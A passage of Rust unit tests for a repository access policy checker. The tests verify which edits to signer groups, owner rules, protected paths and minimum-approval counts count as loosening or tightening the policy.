        let after = p(&format!("{}[[signer]]\nname = \"Lee\"\npeople = [\"Dana\"]\n", PEOPLE.split("[[trust.key]]\nname = \"lee\"").next().unwrap()));
        assert!(loosens(&before, &after).is_empty(), "the repository alone cannot see the floor");
        assert_eq!(loosens_under(&before, &after, Some(&floor)), vec!["signer".to_string()]);
        assert!(loosens_under(&before, &before, Some(&floor)).is_empty());
    }

    #[test]
    fn raising_min_tightens() {
        let two = format!("{OWNED}min = 2\n");
        assert!(loosens(&owners(OWNED), &owners(&two)).is_empty());
        assert_eq!(loosens(&owners(&two), &owners(OWNED)), vec!["protect.owner".to_string()], "lowering it loosens");
    }

    #[test]
    fn removing_an_owner_rule_or_its_paths_loosens_and_adding_one_tightens() {
        let group = "[[signer]]\nname = \"eng-managers\"\npeople = [\"Dana\", \"Lee\"]\n";
        assert_eq!(loosens(&owners(OWNED), &owners(group)), vec!["protect.owner".to_string()]);
        let fewer = OWNED.replace("[\"billing/**\", \"payments/**\"]", "[\"billing/**\"]");
        assert_eq!(loosens(&owners(OWNED), &owners(&fewer)), vec!["protect.owner".to_string()]);
        assert!(loosens(&owners(group), &owners(OWNED)).is_empty(), "a new owner rule asks for more");
        let new_group = format!("{OWNED}[[signer]]\nname = \"ops\"\npeople = [\"Sam\"]\n");
        assert!(loosens(&owners(OWNED), &owners(&new_group)).is_empty(), "a group nobody names changes nothing");
        // A browser may add an owner rule or take someone out of a group; never the reverse.
        assert!(terminal_only(&owners(group), &owners(OWNED), &[]).is_empty());
    }
}
